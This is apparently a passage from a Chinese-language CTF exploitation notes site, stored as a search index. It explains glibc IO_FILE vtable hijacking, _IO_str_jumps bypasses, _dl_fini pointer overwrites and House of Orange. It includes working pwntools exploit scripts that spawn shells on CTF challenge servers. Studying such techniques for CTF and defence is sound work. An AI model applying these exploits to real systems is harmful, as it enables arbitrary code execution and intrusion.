\u7684\u8fdc\u7a0b\u73af\u5883\u5bf9\u5e94\u662f Ubuntu 16 libc 2.23\uff1a Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enable \u7a0b\u5e8f\u53ea\u80fd\u6709\u4e00\u4e2a\u5806\uff0c\u7528\u7ed3\u6784\u4f53\u7ef4\u62a4\uff0c\u7ed3\u6784\u5982\u4e0b\uff1a struct { size ; //8bit data ; //8bit chunk_addr ; //8bit }","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_13","text":"\u5728 add \u65f6\u5199\u5165 author \u65f6\u6ea2\u51fa 8 bit \u521a\u597d\u53ef\u4ee5\u8986\u76d6\u5806\u6307\u9488\uff1a \u7ed3\u5408 edit \u53ef\u4ee5\u591a\u6b21\u4fee\u6539\u5806\u6307\u9488\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u591a\u6b21\u5199\u5165\uff1a","title":"\u6f0f\u6d1e"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_14","text":"myexit \u51fd\u6570\u6709\u5173\u95ed stdout\u3001stderr \u540e\u6267\u884c exit() \uff0cexit() \u65f6\u7cfb\u7edf\u4f1a\u8c03\u7528 _IO_flush_all_lockp \u3002\u4fee\u6539\u5806\u6307\u9488\u5230 _IO_2_1_stderr_ \uff0c\u5e03\u7f6e\u7ed5\u8fc7\u7ed5\u8fc7\u9700\u8981\u7684\u6570\u636e\uff1b\u5728\u9002\u5f53\u4f4d\u7f6e\u5199\u5165 system \uff0c\u5c06 vtable \u52ab\u6301\u5230\u8fd9\u4e2a\u7a7a\u95f4\u4e0a\uff0c\u5b8c\u6210\u52ab\u6301 _IO_flush_all_lockp \u4e3a system \u3002\u5199\u5165 _IO_2_1_stderr_ \u65f6\u5c06 /bin/sh \u5199\u5230 _IO_FILE \u7684\u5934\u90e8\uff0c\u8c03\u7528\u865a\u51fd\u6570\u65f6 _IO_FILE \u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002 \u56e0\u4e3a vtable \u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684 _IO_FILE_plus \u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u628a \"sh\" \u5199\u5165 _IO_FILE_plus \u5934\u90e8\u3002 \u8c03\u8bd5\u67e5\u770b\u7ed3\u6784\u4f53 \uff1a p * (( struct [ \u7ed3\u6784\u4f53\u7c7b\u578b ] * )[ \u5730\u5740 ])","title":"\u601d\u8def"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#exp","text":"from pwn import * context ( log_level = 'debug' ) #,terminal=['tmux','sp','-h']) #p = process(\"./ciscn_2019_n_7\") p = remote ( \"node3.buuoj.cn\" , 28957 ) #libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") libc = ELF ( './libc-2.23.so' ) elf = ELF ( \"./ciscn_2019_n_7\" ) def command ( id ): p . recvuntil ( \"-> \\n \" ) p . sendline ( str ( id )) def edit ( name , content ): command ( 2 ) p . recvuntil ( \"New Author name: \\n \" ) p . sendline ( name ) p . recvuntil ( \"New contents: \\n \" ) p . send ( content ) command ( 666 ) puts_addr = int ( p . recv ( 14 ), 16 ) log . info ( \"puts_addr:\" + hex ( puts_addr )) libc_base = puts_addr - libc . sym [ 'puts' ] log . info ( \"libc_base:\" + hex ( libc_base )) # IO_list_all=libc_base+libc.sym['_IO_list_all'] # log.info(\"IO_list_all:\"+hex(IO_list_all)) IO_2_1_stderr = libc . sym [ '_IO_2_1_stderr_' ] + libc_base log . info ( \"IO_2_1_stderr:\" + hex ( IO_2_1_stderr )) system = libc_base + libc . sym [ 'system' ] log . info ( \"system:\" + hex ( system )) command ( 1 ) p . recvuntil ( \": \\n \" ) p . sendline ( str ( 0xf8 )) p . recvuntil ( \": \\n \" ) payload = 'a' * 8 + p64 ( IO_2_1_stderr ) p . send ( payload ) #gdb.attach(p,\"b *$rebase(0xb02)\") #define writebase_offset 0x20 ->0 #define writeptr_offset 0x28 ->1 #define mode_offset 0xc0 ->0 #define vtable_offset 0xd8 ->system&onegadget payload = '/bin/sh \\x00 ' . ljust ( 0x20 , ' \\x00 ' ) + p64 ( 0 ) + p64 ( 1 ) #0x30 payload += p64 ( 0 ) * 4 + p64 ( system ) * 4 #p64(libc_base+0x4526a)*4#0x50-0x70 payload = payload . ljust ( 0xd8 , ' \\x00 ' ) payload += p64 ( IO_2_1_stderr + 0x40 ) edit ( 'a \\n ' , payload ) command ( 4 ) p . sendline ( 'exec 1>&0' ) p . interactive ()","title":"EXP"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#glibc-224","text":"","title":"glibc 2.24 \u5229\u7528"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_15","text":"glibc 2.24 \u540e\u65b0\u589e vtable \u68c0\u67e5\u51fd\u6570\uff1aIO_validate_vtable \u548c _IO_vtable_check \u3002 libio/libioP.h libio/vtables.c vtables \u88ab\u653e\u8fdb\u4e86\u4e13\u7528\u7684\u53ea\u8bfb\u7684 __libc_IO_vtables \u6bb5\uff0cglibc \u4f1a\u5728\u8c03\u7528\u865a\u51fd\u6570\u4e4b\u524d\u9996\u5148\u68c0\u67e5 vtable \u5730\u5740\u7684\u5408\u6cd5\u6027\u3002\u9996\u5148\u4f1a\u9a8c\u8bc1 vtable \u662f\u5426\u4f4d\u4e8e_IO_vtable \u6bb5\u4e2d\uff0c\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\u5c31\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u4f1a\u8c03\u7528 _IO_vtable_check \u3002 \u5f88\u591a\u5bf9 vtable \u7684\u653b\u51fb\u65b9\u5f0f\u4e0d\u518d\u9002\u7528\uff0c\u601d\u8def\u8f6c\u5411 stream_buffer","title":"\u65b0\u589e\u9632\u5fa1\u673a\u5236"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_io_str_jumps","text":"libc \u4e2d\u4e0d\u4ec5\u4ec5\u53ea\u6709 _IO_file_jumps \u4e00\u4e2a vtable \uff0c\u8fd8\u6709\u4e00\u4e2a\u53eb _IO_str_jumps \u7684 \uff0c\u8fd9\u4e2a vtable \u4e0d\u5728 check \u8303\u56f4\u4e4b\u5185\u3002 \u6bd4\u5982 _IO_str_jumps \uff08\u8be5\u7b26\u53f7\u5728strip\u540e\u4f1a\u4e22\u5931\uff09\uff1a // libio/strops.c const struct _IO_jump_t _IO_str_jumps libio_vtable = { JUMP_INIT_DUMMY , JUMP_INIT ( finish , _IO_str_finish ), JUMP_INIT ( overflow , _IO_str_overflow ), JUMP_INIT ( underflow , _IO_str_underflow ), JUMP_INIT ( uflow , _IO_default_uflow ), JUMP_INIT ( pbackfail , _IO_str_pbackfail ), JUMP_INIT ( xsputn , _IO_default_xsputn ), JUMP_INIT ( xsgetn , _IO_default_xsgetn ), JUMP_INIT ( seekoff , _IO_str_seekoff ), JUMP_INIT ( seekpos , _IO_default_seekpos ), JUMP_INIT ( setbuf , _IO_default_setbuf ), JUMP_INIT ( sync , _IO_default_sync ), JUMP_INIT ( doallocate , _IO_default_doallocate ), JUMP_INIT ( read , _IO_default_read ), JUMP_INIT ( write , _IO_default_write ), JUMP_INIT ( seek , _IO_default_seek ), JUMP_INIT ( close , _IO_default_close ), JUMP_INIT ( stat , _IO_default_stat ), JUMP_INIT ( showmanyc , _IO_default_showmanyc ), JUMP_INIT ( imbue , _IO_default_imbue ) }; // libio/libioP.h #define JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0) _IO_str_jumps \u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u53eb\u505a _IO_str_overflow \u7684\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u4e2d\u5b58\u5728\u76f8\u5bf9\u5730\u5740\u7684\u5f15\u7528\uff08\u53ef\u4f2a\u9020\uff09\uff1a int _IO_str_overflow ( _IO_FILE * fp , int c ) { int flush_only = c == EOF ; _IO_size_t pos ; if ( fp -> _flags & _IO_NO_WRITES ) return flush_only ? 0 : EOF ; if (( fp -> _flags & _IO_TIED_PUT_GET ) && ! ( fp -> _flags & _IO_CURRENTLY_PUTTING )) { fp -> _flags |= _IO_CURRENTLY_PUTTING ; fp -> _IO_write_ptr = fp -> _IO_read_ptr ; fp -> _IO_read_ptr = fp -> _IO_read_end ; } pos = fp -> _IO_write_ptr - fp -> _IO_write_base ; if ( pos >= ( _IO_size_t ) ( _IO_blen ( fp ) + flush_only )) // \u6761\u4ef6 #define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base) { if ( fp -> _flags & _IO_USER_BUF ) /* not allowed to enlarge */ return EOF ; else { char * new_buf ; char * old_buf = fp -> _IO_buf_base ; size_t old_blen = _IO_blen ( fp ); _IO_size_t new_size = 2 * old_blen + 100 ; // \u901a\u8fc7\u8ba1\u7b97 new_size \u4e3a \"/bin/sh\\x00\" \u7684\u5730\u5740 if ( new_size < old_blen ) return EOF ; new_buf = ( char * ) ( * (( _IO_strfile * ) fp ) -> _s . _allocate_buffer ) ( new_size ); // \u5728\u8fd9\u4e2a\u76f8\u5bf9\u5730\u5740\u653e\u4e0a system \u7684\u5730\u5740\uff0c\u5373 system(\"/bin/sh\") [...] // libio/strfile.h struct _IO_str_fields { _IO_alloc_type _allocate_buffer ; _IO_free_type _free_buffer ; }; struct _IO_streambuf { struct _IO_FILE _f ; const struct _IO_jump_t * vtable ; }; typedef struct _IO_strfile_ { struct _IO_streambuf _sbf ; struct _IO_str_fields _s ; } _IO_strfile ; \u6240\u4ee5\u53ef\u4ee5\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\uff1a fp->_flags = 0 fp->_IO_buf_base = 0 fp->_IO_buf_end = (bin_sh_addr - 100) / 2 fp->_IO_write_ptr = 0xffffffff fp->_IO_write_base = 0 fp->_mode = 0 \u6709\u4e00\u70b9\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c bin_sh_addr \u7684\u5730\u5740\u4ee5\u5947\u6570\u7ed3\u5c3e\uff0c\u4e3a\u4e86\u907f\u514d\u9664\u6cd5\u5411\u4e0b\u53d6\u6574\u7684\u5e72\u6270\uff0c\u53ef\u4ee5\u5c06\u8be5\u5730\u5740\u52a0 1\u3002\u53e6\u5916 system(\"/bin/sh\") \u662f\u53ef\u4ee5\u7528 one_gadget \u6765\u4ee3\u66ff\u7684\uff0c\u8fd9\u6837\u4f3c\u4e4e\u66f4\u52a0\u7b80\u5355\u3002 \u5b8c\u6574\u7684\u8c03\u7528\u8fc7\u7a0b\uff1a malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_overflow \u3002 \u4e0e\u4f20\u7edf\u7684 house-of-orange \u4e0d\u540c\u7684\u662f\uff0c\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u4e0d\u518d\u9700\u8981\u77e5\u9053 heap \u7684\u5730\u5740\uff0c\u56e0\u4e3a _IO_str_jumps vtable \u662f\u5728 libc \u4e0a\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u80fd\u6cc4\u9732\u51fa libc \u7684\u5730\u5740\u5c31\u53ef\u4ee5\u4e86\u3002 \u5728 _IO_str_jumps \u4e2d\uff0c\u8fd8\u6709\u53e6\u4e00\u4e2a\u51fd\u6570 _IO_str_finish \uff0c\u5b83\u7684\u68c0\u67e5\u6761\u4ef6\u6bd4\u8f83\u7b80\u5355\uff1a void _IO_str_finish ( _IO_FILE * fp , int dummy ) { if ( fp -> _IO_buf_base && ! ( fp -> _flags & _IO_USER_BUF )) // \u6761\u4ef6 ((( _IO_strfile * ) fp ) -> _s . _free_buffer ) ( fp -> _IO_buf_base ); // \u5728\u8fd9\u4e2a\u76f8\u5bf9\u5730\u5740\u653e\u4e0a system \u7684\u5730\u5740 fp -> _IO_buf_base = NULL ; _IO_default_finish ( fp , 0 ); } \u53ea\u8981\u5728 fp->_IO_buf_base \u653e\u4e0a \"/bin/sh\" \u7684\u5730\u5740\uff0c\u7136\u540e\u8bbe\u7f6e fp->_flags = 0 \u5c31\u53ef\u4ee5\u4e86\u7ed5\u8fc7\u51fd\u6570\u91cc\u7684\u6761\u4ef6\u3002 \u90a3\u4e48\u600e\u6837\u8ba9\u7a0b\u5e8f\u8fdb\u5165 _IO_str_finish \u6267\u884c\u5462\uff0c fclose(fp) \u662f\u4e00\u6761\u8def\uff0c\u4f46\u4f3c\u4e4e\u6709\u5c40\u9650\u3002\u8fd8\u662f\u56de\u5230\u5f02\u5e38\u5904\u7406\u4e0a\u6765\uff0c\u5728 _IO_flush_all_lockp \u51fd\u6570\u4e2d\u662f\u901a\u8fc7 _IO_OVERFLOW \u6267\u884c\u7684 __GI__IO_str_overflow \uff0c\u800c _IO_OVERFLOW \u662f\u6839\u636e __overflow \u76f8\u5bf9\u4e8e _IO_str_jumps vtable \u7684\u504f\u79fb\u627e\u5230\u5177\u4f53\u51fd\u6570\u7684\u3002\u6240\u4ee5\u5982\u679c\u6211\u4eec\u4f2a\u9020\u4f20\u9012\u7ed9 _IO_OVERFLOW(fp) \u7684 fp \u662f vtable \u7684\u5730\u5740\u51cf\u53bb 0x8\uff0c\u90a3\u4e48\u6839\u636e\u504f\u79fb\uff0c\u7a0b\u5e8f\u5c06\u627e\u5230 _IO_str_finish \u5e76\u6267\u884c\u3002 \u6240\u4ee5\u53ef\u4ee5\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\uff1a fp->_mode = 0 fp->_IO_write_ptr = 0xffffffff fp->_IO_write_base = 0 fp->_wide_data->_IO_buf_base = bin_sh_addr \uff08\u4e5f\u5c31\u662f fp->_IO_write_end\uff09 fp->_flags2 = 0 fp->_mode = 0 \u5b8c\u6574\u7684\u8c03\u7528\u8fc7\u7a0b\uff1a malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_finish \u3002","title":"_IO_str_jumps"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_io_wstr_jumps","text":"_IO_wstr_jumps \u4e5f\u662f\u4e00\u4e2a\u7b26\u5408\u6761\u4ef6\u7684 vtable\uff0c\u603b\u4f53\u4e0a\u548c\u4e0a\u9762\u8bb2\u7684 _IO_str_jumps \u5dee\u4e0d\u591a\uff1a // libio/wstrops.c const struct _IO_jump_t _IO_wstr_jumps libio_vtable = { JUMP_INIT_DUMMY , JUMP_INIT ( finish , _IO_wstr_finish ), JUMP_INIT ( overflow , ( _IO_overflow_t ) _IO_wstr_overflow ), JUMP_INIT ( underflow , ( _IO_underflow_t ) _IO_wstr_underflow ), JUMP_INIT ( uflow , ( _IO_underflow_t ) _IO_wdefault_uflow ), JUMP_INIT ( pbackfail , ( _IO_pbackfail_t ) _IO_wstr_pbackfail ), JUMP_INIT ( xsputn , _IO_wdefault_xsputn ), JUMP_INIT ( xsgetn , _IO_wdefault_xsgetn ), JUMP_INIT ( seekoff , _IO_wstr_seekoff ), JUMP_INIT ( seekpos , _IO_default_seekpos ), JUMP_INIT ( setbuf , _IO_default_setbuf ), JUMP_INIT ( sync , _IO_default_sync ), JUMP_INIT ( doallocate , _IO_wdefault_doallocate ), JUMP_INIT ( read , _IO_default_read ), JUMP_INIT ( write , _IO_default_write ), JUMP_INIT ( seek , _IO_default_seek ), JUMP_INIT ( close , _IO_default_close ), JUMP_INIT ( stat , _IO_default_stat ), JUMP_INIT ( showmanyc , _IO_default_showmanyc ), JUMP_INIT ( imbue , _IO_default_imbue ) }; \u5229\u7528\u51fd\u6570 _IO_wstr_overflow \uff1a _IO_wint_t _IO_wstr_overflow ( _IO_FILE * fp , _IO_wint_t c ) { int flush_only = c == WEOF ; _IO_size_t pos ; if ( fp -> _flags & _IO_NO_WRITES ) return flush_only ? 0 : WEOF ; if (( fp -> _flags & _IO_TIED_PUT_GET ) && ! ( fp -> _flags & _IO_CURRENTLY_PUTTING )) { fp -> _flags |= _IO_CURRENTLY_PUTTING ; fp -> _wide_data -> _IO_write_ptr = fp -> _wide_data -> _IO_read_ptr ; fp -> _wide_data -> _IO_read_ptr = fp -> _wide_data -> _IO_read_end ; } pos = fp -> _wide_data -> _IO_write_ptr - fp -> _wide_data -> _IO_write_base ; if ( pos >= ( _IO_size_t ) ( _IO_wblen ( fp ) + flush_only )) // \u6761\u4ef6 #define _IO_wblen(fp) ((fp)->_wide_data->_IO_buf_end - (fp)->_wide_data->_IO_buf_base) { if ( fp -> _flags2 & _IO_FLAGS2_USER_WBUF ) /* not allowed to enlarge */ return WEOF ; else { wchar_t * new_buf ; wchar_t * old_buf = fp -> _wide_data -> _IO_buf_base ; size_t old_wblen = _IO_wblen ( fp ); _IO_size_t new_size = 2 * old_wblen + 100 ; // \u4f7f new_size * sizeof(wchar_t) \u4e3a \"/bin/sh\" \u7684\u5730\u5740 if ( __glibc_unlikely ( new_size < old_wblen ) || __glibc_unlikely ( new_size > SIZE_MAX / sizeof ( wchar_t ))) return EOF ; new_buf = ( wchar_t * ) ( * (( _IO_strfile * ) fp ) -> _s . _allocate_buffer ) ( new_size * sizeof ( wchar_t )); // \u5728\u8fd9\u4e2a\u76f8\u5bf9\u5730\u5740\u653e\u4e0a system \u7684\u5730\u5740 [...] \u5229\u7528\u51fd\u6570 _IO_wstr_finish \uff1a void _IO_wstr_finish ( _IO_FILE * fp , int dummy ) { if ( fp -> _wide_data -> _IO_buf_base && ! ( fp -> _flags2 & _IO_FLAGS2_USER_WBUF )) // \u6761\u4ef6 ((( _IO_strfile * ) fp ) -> _s . _free_buffer ) ( fp -> _wide_data -> _IO_buf_base ); // \u5728\u8fd9\u4e2a\u76f8\u5bf9\u5730\u5740\u653e\u4e0a system \u7684\u5730\u5740 fp -> _wide_data -> _IO_buf_base = NULL ; _IO_wdefault_finish ( fp , 0 ); }","title":"_IO_wstr_jumps"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_dl_fini","text":"\u4ee5 hctf2018_the_end \u4e3a\u4f8b\u5b50\uff0c\u9898\u76ee\u90e8\u7f72\u5728 Ubuntu 18\uff0c\u8fdc\u7a0b\u5b9e\u9a8c\u5230 buu \u3002 \u8fd9\u6761\u9898\u76ee\u5728 Ubuntu 18 \u4e0b\u6709 vtable \u68c0\u67e5\uff0c\u4fee\u6539 vtable \u65b9\u6cd5\u5931\u6548\u3002 \u4e0b\u9762\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\u5bfb\u627e libc \u4e0e ld \u504f\u79fb\u65f6\u4e0e buu \u9776\u673a\u60c5\u51b5\u4e0d\u4e00\u6837\uff0c\u56e0\u4e3a\u6211\u4eec\u672c\u5730\u5728 docker \u6539 libc \u8fd0\u884c ld \u548c libc \u4f4d\u7f6e\u53d8\u5316\u4e86\uff0c\u5177\u4f53\u770b\u540e\u6587 exit() \u51fd\u6570\u7684\u5229\u7528\u94fe\uff1a \u5728 exit \u51fd\u6570\u4e2d\u4f1a\u8c03\u7528 __run_exit_handlers() \uff1a //glibc/stdlib/exit.c \u2026\u2026 void exit ( int status ) { __run_exit_handlers ( status , & __exit_funcs , true , true ); } \u2026\u2026 __run_exit_handlers() \u8c03\u7528 _dl_fini \uff1a \u5728 _dl_fini \u51fd\u6570\u4e2d\u8c03\u7528\u8c03\u7528\u51fd\u6570 __rtld_lock_lock_recursive() \u548c __rtld_lock_unlock_recursive() \uff1a //glibc/elf/dl-fini.c ... #endif for ( Lmid_t ns = GL ( dl_nns ) - 1 ; ns >= 0 ; -- ns ) { /* Protect against concurrent loads and unloads. */ __rtld_lock_lock_recursive ( GL ( dl_load_lock )); unsigned int nloaded = GL ( dl_ns )[ ns ]. _ns_nloaded ; /* No need to do anything for empty namespaces or those used for auditing DSOs. */ if ( nloaded == 0 #ifdef SHARED || GL ( dl_ns )[ ns ]. _ns_loaded -> l_auditing != do_audit #endif ) __rtld_lock_unlock_recursive ( GL ( dl_load_lock )); else { ... __rtld_lock_lock_recursive \u3001 __rtld_lock_unlock_recursive \u662f\u901a\u8fc7\u5b8f\u5b9a\u4e49\u6765\u7684\uff1a //glibc/sysdeps/nptl/libc-lockP.h # define __rtld_lock_lock_recursive(NAME) \\ GL(dl_rtld_lock_recursive) (&(NAME).mutex) # define __rtld_lock_unlock_recursive(NAME) \\ GL(dl_rtld_unlock_recursive) (&(NAME).mutex) \u4ece\u4e0a\u9762\u5b9a\u4e49\u77e5\u9053\u771f\u6b63\u51fd\u6570\u662f GL \u5b8f\u4e2d\u7684 dl_rtld_lock_recursive \uff0c\u67e5\u770b\u5b8f GL \u5b9a\u4e49\uff1a //Rtld.c extern struct rtld_global _rtld_local __attribute__ (( alias ( \"_rtld_global\" ), visibility ( \"hidden\" ))); //Ldsodefs.h extern struct rtld_global _rtld_local __rtld_local_attribute__ ; # undef __rtld_local_attribute__ # endif extern struct rtld_global _rtld_global __rtld_global_attribute__ ; # undef __rtld_global_attribute__ //Db_info.c typedef struct rtld_global rtld_global ; //elf/Rtld.c struct rtld_global _rtld_global = { /* Generally the default presumption without further information is an * executable stack but this is not true for all platforms. */ . _dl_stack_flags = DEFAULT_STACK_PERMS , #ifdef _LIBC_REENTRANT . _dl_load_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER , . _dl_load_write_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER , #endif . _dl_nns = 1 , . _dl_ns = { #ifdef _LIBC_REENTRANT [ LM_ID_BASE ] = { . _ns_unique_sym_table = { . lock = _RTLD_LOCK_RECURSIVE_INITIALIZER } } #endif } }; //Ldsodefs.h #ifndef SHARED # define EXTERN extern # define GL(name) _##name #else # define EXTERN # if IS_IN (rtld) # define GL(name) _rtld_local._##name # else # define GL(name) _rtld_global._##name # endif \u6709\u70b9\u590d\u6742\uff0c\u8fd9\u91cc\u7b80\u5316\u63cf\u8ff0\u4e00\u4e0b\uff1a\u4ece 40-45 \u77e5\u9053 GL \u662f _rtld_local \u6216 _rtld_global \u7c7b\u578b\u7684\u7ed3\u6784\u4f53\uff1b\u4e24\u79cd\u7ed3\u6784\u4f53\u5b9a\u4e49\u770b\u4e0a\u9762\u4ee3\u7801\u524d\u9762\u90e8\u5206\u3002\u6240\u4ee5 GL(dl_rtld_lock_recursive) \u662f _rtld_global \u7ed3\u6784\u4f53\u5185\u7684 dl_rtld_lock_recursive \u6307\u9488\u3002 \u6709\u70b9\u7ed5\uff0c\u5148\u6574\u7406\u4e0b _dl_fini \u8c03\u7528\u7684\u5b9e\u9645\u662f\u4ec0\u4e48\uff1a _dl_fini \u8c03\u7528 __rtld_lock_lock_recursive __rtld_lock_lock_recursive \u5b8f\u5b9a\u4e49\u4e3a GL(dl_rtld_lock_recursive) GL \u662f\u4e00\u4e2a _rtld_global \u7ed3\u6784\u4f53 dl_rtld_lock_recursive \u662f _rtld_global \u7ed3\u6784\u4f53\u7684\u4e00\u4e2a\u6307\u9488 _dl_fini \u5b9e\u9645\u8c03\u7528 _rtld_global \u7ed3\u6784\u4f53\u7684 _dl_rtld_lock_recursive \u6307\u9488\u3002 \u5728 gdb \u4e2d\u67e5\u770b _rtld_global \u4fe1\u606f\uff1a p _rtld_global#\u67e5\u770b\u7ed3\u6784\u4f53\u5185\u5bb9 p *_rtld_global#\u67e5\u770b\u7ed3\u6784\u4f53\u5730\u5740 \u5728\u7ed3\u6784\u4f53\u91cc\u9762\u627e\u5230\u4e86\u5b9e\u9645\u7684\u8c03\u7528\u7684\u51fd\u6570\u6307\u9488\uff1a **_rtld_global \u662f\u5728 ld.so \u5185\u5b58\u6bb5**\u91cc\u9762\u7684\uff0c\u6cc4\u9732 libc \u53ef\u4ee5\u901a\u8fc7\u504f\u79fb\u8ba1\u7b97\u51fa ld \u57fa\u5730\u5740\uff0c\u6309\u7167\u56fe\u4e2d\u504f\u79fb\u5e94\u8be5\u4e3a offset=0x7f30c73af000-0x7f30c6df8000=0x5b7000 \uff1a \u7531\u4e8e\u6211\u8fd9\u91cc\u8c03\u8bd5\u65f6\u6539 libc \u548c ld \u6240\u4ee5\u8ba1\u7b97\u51fa\u6765\u7684\u504f\u79fb 0x5b7000 \u5e76\u4e0d\u662f\u8fdc\u7a0b\u73af\u5883\uff08\u539f\u751f18.04\u8fd0\u884c\uff09\u4e0b\u7684\u504f\u79fb\uff0c\u5728 Ubuntu 18.04 \u4e0b\u91cd\u65b0\u8c03\u8bd5\u8ba1\u7b97\u5f97\u51fa\u504f\u79fb\u4e3a 0x3f1000 \uff0c\u8fd9\u4e2a\u504f\u79fb\u4e0e buu \u4e0a\u7684\u73af\u5883\u4e00\u6837\uff1a \u8ba1\u7b97\u51fa _rtld_global \u7684\u5730\u5740\u901a\u8fc7\u504f\u79fb\u5f97\u5230 _dl_rtld_lock_recursive \u3001_dl_rtld_unlock_recursive \u5730\u5740\u3002\u8fd9\u4e2a\u504f\u79fb\u6211\u662f gdb \u67e5\u770b _rtld_global \u5730\u5740\uff0c\u4e0d\u65ad\u52a0\u504f\u79fb\u627e\uff1a _dl_rtld_lock_lock_recursive -> 0xf00 _dl_rtld_lock_unlock_recursive -> 0xf08 \u4e24\u4e2a\u51fd\u6570\u90fd\u4f1a\u8c03\u7528\uff0c\u5c06\u5176\u6307\u9488\u6539\u6210 onegadget \uff0c\u6700\u540e\u5c1d\u8bd5 _dl_rtld_unlock_recursive \u624d\u6ee1\u8db3 onegadget \u6761\u4ef6\u3002 EXP \u5982\u4e0b\uff1a #remote:ubuntu18.04 from pwn import * context ( log_level = 'debug' , arch = 'amd64' , os = 'linux' , terminal = [ 'tmux' , 'sp' , '-h' ]) #p = process([\"/glibc/2.27/64/lib/ld-2.27.so\", \"./the_end\"], env={\"LD_PRELOAD\":\"/glibc/2.27/64/lib/libc-2.27.so\"}) #libc = ELF(\"/glibc/2.27/64/lib/libc-2.27.so\") #ld = ELF(\"/glibc/2.27/64/lib/ld-2.27.so\") # p = process(\"./the_end\") # libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") # ld = ELF(\"/lib/x86_64-linux-gnu/ld-2.27.so\") p = remote ( \"node3.buuoj.cn\" , 27518 ) libc = ELF ( \"./libc-2.27.so\" ) ld = ELF ( \"/lib/x86_64-linux-gnu/ld-2.27.so\" ) elf = ELF ( \"./the_end\" ) offset_ldbase_of_libcbase = 0x3f1000 #0x5b7000 offset_dl_rtld_lock_recursive_of_rtld_global = 0xf00 offset_dl_rtld_unlock_recursive_of_rtld_global = 0xf08 p . recvuntil ( \"gift \" ) sleep_addr = int ( p . recv ( 14 ), 16 ) log . info ( \"sleep_addr:\" + hex ( sleep_addr )) libc_base = sleep_addr - libc . sym [ 'sleep' ] log . info ( \"libc_base:\" + hex ( libc_base )) ld_base = libc_base + offset_ldbase_of_libcbase log . info ( \"ld_base:\" + hex ( ld_base )) rtld_global = ld_base + ld . sym [ '_rtld_global' ] log . info ( \"rtld_global:\" + hex ( rtld_global )) dl_rtld_lock_recursive = rtld_global + offset_dl_rtld_lock_recursive_of_rtld_global log . info ( \"dl_rtld_lock_recursive:\" + hex ( dl_rtld_lock_recursive )) dl_rtld_unlock_recursive = rtld_global + offset_dl_rtld_unlock_recursive_of_rtld_global log . info ( \"dl_rtld_unlock_recursive_of_rtld_global:\" + hex ( dl_rtld_unlock_recursive )) onegadget = libc_base + 0x4f322 ''' 0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp & 0xf == 0 rcx == NULL 0x4f322 execve(\"/bin/sh\", rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a38c execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ''' #gdb.attach(p,\"b *$rebase(0x964)\") for i in range ( 5 ): #p.send(p64(dl_rtld_lock_recursive+i)) p . send ( p64 ( dl_rtld_unlock_recursive + i )) p . send ( p64 ( onegadget )[ i ]) p . sendline ( \"exec 1>&0\" ) p . interactive ()","title":"\u4fee\u6539 _dl_fini \u51fd\u6570\u6307\u9488"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#house-of-orange","text":"","title":"House of orange"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_16","text":"house of orange \u7279\u6b8a\u4e4b\u5904\u662f\u9898\u76ee\u6ca1\u6709 free \u51fd\u6570\u7b49\u91ca\u653e\u5806\u5757\u51fd\u6570\u3002house of orange \u6838\u5fc3\u601d\u60f3\u901a\u8fc7\u6f0f\u6d1e\u5b9e\u73b0 free \u7684\u6548\u679c\u3002","title":"\u6982\u8ff0"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_17","text":"\u80fd\u63a7\u5236 topchunk size \u4f4d\uff08\u5806\u6ea2\u51fa\u7b49\uff09 \u80fd\u63a7\u5236\u5806\u5206\u914d\u7684\u5927\u5c0f","title":"\u4f7f\u7528\u6761\u4ef6"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_18","text":"\u5f53 topchunk \u4e0d\u80fd\u6ee1\u8db3\u7533\u8bf7\u5206\u914d\u7684\u5927\u5c0f\u65f6\uff0ctopchunk \u88ab\u91ca\u653e\u8fdb unsortedbin \uff0c\u5b9e\u73b0\u6ca1\u6709 free \u51fd\u6570\u91ca\u653e\u5806\u5757\u3002 \u6269\u5c55\u5806\u7a7a\u95f4\u6709 mmap \u548c brk \u4e24\u79cd\u65b9\u5f0f\uff0c\u6211\u4eec\u9700\u8981\u4ee5 brk \u62d3\u5c55\uff0c\u9700\u8981\u7ed5\u8fc7 libc \u4e00\u4e9b check \uff1a malloc 